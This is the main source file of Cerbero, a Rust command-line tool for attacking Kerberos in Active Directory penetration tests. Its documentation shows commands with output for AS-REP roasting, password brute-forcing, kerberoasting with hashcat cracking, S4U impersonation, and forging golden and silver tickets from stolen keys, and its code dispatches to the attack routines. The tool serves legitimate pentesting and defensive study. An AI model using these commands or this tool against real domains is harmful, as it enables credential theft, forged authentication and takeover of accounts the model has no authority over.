//! # Cerbero
//!
//! Kerberos protocol attacker. Tool to perform several tasks
//! related with Kerberos protocol in an Active Directory pentest.
//!
//! ## Installation
//!
//! From crates:
//! ```sh
//! cargo install cerbero
//! ```
//!
//! From repo:
//! ```sh
//! git clone https://gitlab.com/Zer1t0/cerbero.git
//! cd cerbero/
//! cargo install --path .
//! ```
//!
//! ## Commands
//! - [ask](#ask)
//! - [asreproast](#asreproast)
//! - [brute](#brute)
//! - [convert](#convert)
//! - [craft](#craft)
//! - [hash](#hash)
//! - [kerberoast](#kerberoast)
//! - [list](#list)
//!
//! ### Ask
//! The `ask` command allows to retrieve Kerberos tickets (TGT/TGS) from the KDC
//! (Domain Controller in Active Directory environment). Moreover also
//! perform requests to obtain tickets by using the S4U2Self and S4U2Proxy
//! Kerberos extensions.
//!
//! Ask TGT:
//! ```shell
//! $ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -vv
//! INFO - Request TGT for Hades
//! INFO - Save Hades TGT in Hades.ccache
//! ```
//!
//! Ask TGS:
//! ```shell
//! $ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -s ldap/under.world -vv
//! WARN - No TGT found in Hades.ccache: Unable to read the file 'Hades.ccache': No such file or directory (os error 2)
//! INFO - Request TGT for Hades
//! INFO - Request ldap/dc01 TGS for Hades
//! INFO - Save Hades TGS for ldap/dc01 in Hades.ccache
//! ```
//!
//! Perform S4u2self:
//! ```shell
//! $ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -i Zeus
//! WARN - No TGT found in Hades.ccache: Unable to read the file 'Hades.ccache': No such file or directory (os error 2)
//! INFO - Request TGT for Hades
//! INFO - Request Zeus S4U2Self TGS for Hades
//! INFO - Save Zeus S4U2Self TGS for Hades in Hades.ccache
//! ```
//!
//! Perform S4u2proxy:
//! ```shell
//! $ cerbero ask -u under.world/Hades -p 'IamtheKingofD34d!!' -i Zeus -s ldap/under.world -vv
//! WARN - No TGT found in Hades.ccache: Unable to read the file 'Hades.ccache': No such file or directory (os error 2)
//! INFO - Request TGT for Hades
//! WARN - No Zeus S4U2Self TGS for Hades found
//! INFO - Request Zeus S4U2Self TGS for Hades
//! INFO - Request ldap/under.world S4U2Proxy TGS for Zeus
//! INFO - Save Zeus S4U2Proxy TGS for ldap/under.world in Hades.ccache
//! ```
//!
//!
//! ### AsRepRoast
//! `asreproast` can be used to discover users that do not require
//! pre-authentication and retrieve a ticket to crack with hashcat or john.
//!
//! Check many users:
//! ```shell
//! cerbero asreproast under.world users.txt
//! ```
//!
//! Check many users with weak RC4 cipher (easier to crack):
//! ```shell
//! cerbero asreproast under.world users.txt --cipher rc4
//! ```
//!
//! ### Brute
//! `brute` performs TGTs requests in order to discover user credentials
//! based on the KDC response. This bruteforce technique allows you to
//! discover:
//! + Valid username/password pairs
//! + Valid usernames
//! + Expired passwords
//! + Blocked or disabled users
//!
//! This attack should be performed carefully since can block user
//! accounts in case of perform many incorrect authentication attemps
//! for the same user.
//!
//! Test many users and passwords:
//! ```shell
//! cerbero brute under.world users.txt passwords.txt
//! ```
//!
//! Test one user and many passwords:
//! ```shell
//! cerbero brute under.world Zeus passwords.txt
//! ```
//!
//! Test many users and one password:
//! ```shell
//! cerbero brute under.world users.txt Olympus1234
//! ```
//!
//! Test one user and one password:
//! ```shell
//! cerbero brute under.world Zeus Olympus1234
//! ```
//!
//! ### Convert
//! `convert` ticket files between krb (Windows) and
//! ccache (Linux) formats.
//!
//! Convert ccache to krb:
//! ```shell
//! $ cerbero convert -i anakin.ccache -o anakin.krb -vv
//! INFO - Read anakin.ccache with ccache format
//! INFO - Detected krb format from output file extension
//! INFO - Save anakin.krb with krb format
//! ```
//!
//! Convert krb to ccache:
//! ```shell
//! $ cerbero convert -i anakin.krb -o anakin.ccache -vv
//! INFO - Read anakin.krb with krb format
//! INFO - Detected ccache format from output file extension
//! INFO - Save anakin.ccache with ccache format
//! ```
//! ### Craft
//! To `craft` golden and silver tickets.
//!
//! Craft a golden ticket (by using the `krbtgt` AES256 key):
//! ```shell
//! $ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --aes fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c -vv
//! INFO - Save kratos TGT in kratos.ccache
//! ```
//!
//! Craft a silver ticket (for the service `cifs` hosted by the machine `styx`):
//! ```shell
//! $ cerbero craft -u under.world/kratos --sid S-1-5-21-658410550-3858838999-180593761 --ntlm 29f9ab984728cc7d18c8497c9ee76c77 -s cifs/styx,under.world -vv
//! INFO - Save kratos TGS for cifs/styx.under.world in kratos.ccache
//! ```
//!
//! ### Hash
//! Calculate the Kerberos keys (password hashes) from the user password.
//!
//! Calculate RC4 key (NT hash):
//! ```shell
//! $ cerbero hash 'IamtheKingofD34d!!'
//! rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
//! ```
//!
//! Calculate all the keys:
//! ```shell
//! $ cerbero hash 'IamtheKingofD34d!!' -u under.world/Hades
//! rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
//! aes128:fe165dec904772a90a177069e4ea7019
//! aes256:1304965c35176aeb72e1ae5fdd6c2fe2e901af7223cb75f5eaac25ad667136e7
//! ```
//!
//! ### Kerberoast
//! To format encrypted part of tickets in order to be cracked by hashcat or john.
//!
//! You need to provide a file with the user services. Each line of the file
//! must have one of the following formats:
//! * `user`
//! * `domain/user`
//! * `user:spn`
//! * `domain/user:spn`
//!
//! When a service [SPN](https://en.hackndo.com/service-principal-name-spn/)
//! is not specified, then a
//! [NT-ENTERPRISE principal](https://swarm.ptsecurity.com/kerberoasting-without-spns/)
//! is used. This can also be useful to bruteforce users with services.
//!
//! An example file is the following:
//! ```
//! sara
//! jack:HTTP/webserver
//! cake.com/john
//! cake.com/peter:HTTP/peter-pc
//! ```
//!
//! By using that file you could obtain a result like the following:
//! ```shell
//! $ cerbero kerberoast u contoso.local/jaime -p Jama1234! -s /tmp/users.txt | tee /tmp/hashes.txt
//! $krb5tgs$23$*sara$CONTOSO.LOCAL$sara@contoso.local*$637b06b244ad69bf30d9b0a956c6143....5f69271
//! $krb5tgs$23$*jack$CONTOSO.LOCAL$HTTP/webserver*$8723987493798178273879856c6....ab78677
//! $krb5tgs$23$*john$CAKE.COM$john@CAKE.COM*$87687619876bde9879879879....1111111
//! $krb5tgs$23$*peter$CAKE.COM$HTTP/peter-pc*$2c77d95792f1393d3f25aec157823....4f6085f
//! ```
//!
//! To get a list of users with services you can use `ldapsearch`:
//! ```shell
//! $ ldapsearch -h 192.168.100.2 -b "dc=contoso,dc=local" -w Vader1234!  -D "Anakin@contoso.local" "(&(samAccountType=805306368)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" samaccountname | grep -i samaccountname: | cut -d ' ' -f 2 | tee users.txt
//! anakin
//! leia
//! ```
//!
//! The tickets could be cracked by using the following [hashcat](https://hashcat.net/) command:
//! ```shell
//! $ hashcat -m 13100 /tmp/hashes.txt wordlist.txt
//! ```
//! ### List
//! `list` shows the tickets information of a credentials file. Similar
//! to `klist` command.
//!
//! ```shell
//! $ cerbero list hades.ccache
//! Ticket cache (ccache): FILE:hades.ccache
//!
//! Hades@UNDER.WORLD => krbtgt/UNDER.WORLD@UNDER.WORLD
//! Valid starting: 01/12/2021 12:08:09
//! Expires: 01/12/2021 22:08:09
//! Renew until: 01/19/2021 12:08:09
//! Flags: 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
//! Etype (skey, tkt): 18 -> aes256-cts-hmac-sha1-96, 18 -> aes256-cts-hmac-sha1-96
//! ```
//!
//! ## Credits
//! This work is based on great work of other people:
//! - [Impacket](https://github.com/SecureAuthCorp/impacket) of Alberto Solino [@agsolino](https://github.com/agsolino)
//! - [Rubeus](https://github.com/GhostPack/Rubeus) of Will [@harmj0y](https://twitter.com/harmj0y) and Elad Shamir [@elad_shamir](https://twitter.com/elad_shamir)
//! - [Mimikatz](https://github.com/gentilkiwi/mimikatz) of [@gentilkiwi](https://twitter.com/gentilkiwi)

mod args;
mod commands;
mod communication;
mod core;
mod error;
mod utils;

use crate::args::{args, Arguments, ArgumentsParser};
use crate::communication::resolve_host;
use crate::communication::{new_krb_channel, KdcComm};
use crate::core::KrbUser;
use crate::core::{EmptyVault, FileVault, Vault};
use crate::error::Result;
use log::error;
use stderrlog;

fn init_log(verbosity: usize) {
    stderrlog::new()
        .module(module_path!())
        .verbosity(verbosity)
        .init()
        .unwrap();
}

fn main() {
    let args = ArgumentsParser::parse(&args().get_matches());

    if let Err(error) = main_inner(args) {
        error!("{}", error);
    }
}

fn main_inner(args: Arguments) -> Result<()> {
    match args {
        Arguments::Ask(args) => ask(args),
        Arguments::AsRepRoast(args) => asreproast(args),
        Arguments::Brute(args) => brute(args),
        Arguments::Convert(args) => convert(args),
        Arguments::Craft(args) => craft(args),
        Arguments::Hash(args) => hash(args),
        Arguments::KerbeRoast(args) => kerberoast(args),
        Arguments::List(args) => list(args),
    }
}

fn ask(args: args::ask::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let creds_file = utils::get_ticket_file(
        args.out_file,
        &args.user.name,
        &args.credential_format,
    );

    let mut vault = FileVault::new(creds_file);

    let kdccomm = KdcComm::new(args.kdcs, args.transport_protocol);

    return commands::ask(
        args.user,
        args.user_key,
        args.impersonate_user,
        args.service,
        &mut vault,
        args.credential_format,
        kdccomm,
    );
}

fn convert(args: args::convert::Arguments) -> Result<()> {
    init_log(args.verbosity);
    let in_file = match args.in_file {
        Some(filename) => filename,
        None => utils::get_env_ticket_file().ok_or(
            "Unable to detect input file, specify -i/--input or KRB5CCNAME",
        )?,
    };

    let in_vault = FileVault::new(in_file);
    let out_vault = FileVault::new(args.out_file);

    return commands::convert(&in_vault, &out_vault, args.cred_format);
}

fn craft(args: args::craft::Arguments) -> Result<()> {
    init_log(args.verbosity);
    let creds_file = utils::get_ticket_file(
        args.credential_file,
        &args.user.name,
        &args.credential_format,
    );

    let vault = FileVault::new(creds_file);

    return commands::craft(
        args.user,
        args.service,
        args.key,
        args.user_rid,
        args.realm_sid,
        &args.groups,
        None,
        args.credential_format,
        &vault,
    );
}

fn hash(args: args::hash::Arguments) -> Result<()> {
    init_log(args.verbosity);
    return commands::hash(&args.password, args.user.as_ref());
}

fn list(args: args::list::Arguments) -> Result<()> {
    init_log(0);
    let in_file = match args.in_file {
        Some(filename) => filename,
        None => utils::get_env_ticket_file()
            .ok_or("Specify file or set KRB5CCNAME")?,
    };

    let in_vault = FileVault::new(in_file);
    return commands::list(&in_vault, args.only_tgts, args.srealm.as_ref());
}

fn brute(args: args::brute::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let usernames = match utils::read_file_lines(&args.users) {
        Ok(users) => users,
        Err(_) => vec![args.users],
    };

    let passwords = match utils::read_file_lines(&args.passwords) {
        Ok(passwords) => passwords,
        Err(_) => vec![args.passwords],
    };

    let kdc_ip = match args.kdc_ip {
        Some(ip) => ip,
        None => resolve_host(&args.realm, Vec::new())?,
    };
    let channel = new_krb_channel(kdc_ip, args.transport_protocol);

    return commands::brute(
        &args.realm,
        usernames,
        passwords,
        &*channel,
        args.cred_format,
    );
}

fn asreproast(args: args::asreproast::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let usernames = match utils::read_file_lines(&args.users) {
        Ok(users) => users,
        Err(_) => vec![args.users],
    };

    let kdc_ip = match args.kdc_ip {
        Some(ip) => ip,
        None => resolve_host(&args.realm, Vec::new())?,
    };
    let channel = new_krb_channel(kdc_ip, args.transport_protocol);

    return commands::asreproast(
        &args.realm,
        usernames,
        args.crack_format,
        &*channel,
        args.etype,
    );
}

fn kerberoast(args: args::kerberoast::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let kdccomm = KdcComm::new(args.kdcs, args.transport_protocol);

    let creds_file = match args.creds_file {
        Some(filename) => Some(filename),
        None => utils::get_env_ticket_file(),
    };

    let mut in_vault: Box<dyn Vault>;
    let out_vault: Option<FileVault>;

    if let Some(creds_file) = creds_file {
        in_vault = Box::new(FileVault::new(creds_file.clone()));

        out_vault = match args.save_tickets {
            true => Some(FileVault::new(creds_file)),
            false => None,
        }
    } else {
        in_vault = Box::new(EmptyVault::new());

        out_vault = match args.save_tickets {
            true => Err("Specify credentials file or set KRB5CCNAME")?,
            false => None,
        }
    }

    let out_ref_vault = out_vault.as_ref();

    return commands::kerberoast(
        args.user,
        args.user_services_file,
        &mut *in_vault,
        out_ref_vault.map(|a| a as &dyn Vault),
        args.user_key.as_ref(),
        args.credential_format,
        args.crack_format,
        args.etype,
        kdccomm,
    );
}
